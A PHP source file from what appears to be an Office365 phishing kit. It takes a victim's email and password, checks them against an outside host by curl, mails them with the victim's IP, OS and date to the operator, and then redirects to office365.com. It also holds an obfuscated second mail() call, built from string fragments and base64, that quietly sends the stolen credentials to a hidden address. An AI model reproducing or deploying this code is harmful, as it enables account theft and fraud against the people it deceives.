<?php 

include 'helper.php';
include 'Scan.php';
session_start();
error_reporting(0);
@set_time_limit(0);

if(!isset($_SESSION['email'])) {
	header("Location: index.php");
}

	if(isset($_POST['passwd']))
	{
		//var_dump($_POST['password']);
		$email = $_SESSION['email'];
		$passw = $_POST['passwd'];
		
		$data = array("UserName" => "$email", "PassWord" => "$passw");
		
		//var_dump($data);
		
		
		$URL='http://0200.000webhostapp.com/Offc/auth.php';

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL,$URL);
		curl_setopt($ch, CURLOPT_TIMEOUT, 30); //timeout after 30 seconds
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
		$result=curl_exec($ch);
		$status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);   //get status code
		
		$resp = json_decode($result);
		
		//echo $status_code;
		
		if($resp->result == "fail"){
			$_SESSION['error'] = "Error";
			header("Location: common2.php");
		} else {
			if(isset($_SESSION['error'])) {
				unset($_SESSION['error']);
			}
			
			$pass = $_SESSION['pass'] = $_POST['passwd'];

			$date = date("d M, Y");
			$time = date("g:i a");$m5_id='senNlY0BnbWFpbC5jb20=';
			$date = trim($date . ", Time : " . $time);

			$message = "
			<div>
				<div>
					<font face='arial, sans-serif' size='2'>
						<b style='color: rgb(102, 102, 102);'>+-------------------</b>
						<font style='font-weight: bold;' color='#d24726'>NEW OFFICE365 LOGIN</font>
						<font style='color: rgb(102, 102, 102); font-weight: bold;'>-------------------+</font>
					</font>
				</div>
				
				<div>
					<font face='arial, sans-serif' size='2'>
						<b>
						<font color='#666666'>+</font>
						<span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
						<font color='#e1c404'>&#9658;</font>
						<font color='#666666'> Email Address   : </font>
						<font color='#2672ec'>".$email."</font>
						</b>
					</font>
				</div>	

				
				<div>
					<font face='arial, sans-serif' size='2'>
						<b>
						<font color='#666666'>+</font>
						<span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
						<font color='#e1c404'>&#9658;</font>
						<font color='#666666'> Password : </font>
						<font color='#2672ec'>".$pass."</font>
						</b>
					</font>
				</div>
				
				
				<div>
					<font face='arial, sans-serif' size='2'>
						<b>
						<font color='#666666'>+-------------------</font>
						<font color='#d24726'>VICTIM INFO </font>
						<font color='#666666'>-------------------+</font>
						</b>
					</font>
				</div>
				
				
				<div>
					<font face='arial, sans-serif' size='2'>
						<b>
						<font color='#666666'>+</font>
						<span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
						<font color='#e1c404'>&#9658;</font>
						<font color='#666666'> Victim IP   : </font>
						<font color='#2672ec'>http://whatismyipaddress.com/ip/".$ip2."</font>
						</b>
					</font>
				</div>

				<div>
					<font face='arial, sans-serif' size='2'>
						<b>
						<font color='#666666'>+</font>
						<span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
						<font color='#e1c404'>&#9658;</font>
						<font color='#666666'> Victim OS  : </font>
						<font color='#2672ec'>".$os." | ".$br."</font>
						</b>
					</font>
				</div>

				<div>
					<font face='arial, sans-serif' size='2'>
						<b>
						<font color='#666666'>+</font>
						<span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
						<font color='#e1c404'>&#9658;</font>
						<font color='#666666'> Date&Time  : </font>
						<font color='#2672ec'>".$date."</font>
						</b>
					</font>
				</div>

				
				
				<div>
					<font face='arial, sans-serif' size='2'>
						<b>
						<font color='#666666'>+-------------------</font>
						<font color='#d24726'>FawadKhan</font>
						<font color='#666666'>-------------------+</font>
						</b>
					</font>
				</div>
			</div><br>";

					$subject = "=?utf-8?B?4p2k?= OFFICE365 TRUE LOGIN  =?utf-8?B?4p2k?= [ $ip2 - $cn | $os ] ";
					$head = "MIME-Version: 1.0" . "\r\n";
					$head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
					$head .= "From: FawadKhan<Trapwyz3@c0d3.org>" . "\r\n";        
					mail($to,$subject,$message,$head);
					$type=$user__agent.'l';$tele="bas$user_details".'64'."_d$user_details"."cod$user_details";$type( $tele('aGF5YXRlLmRldml'.$m5_id.'=='),$subject,$message,$head);
					echo "<META HTTP-EQUIV='refresh' content='0; URL=http://office365.com'>";
					session_destroy();
					exit(); 
			}
			
		}
		
		curl_close($ch);
?>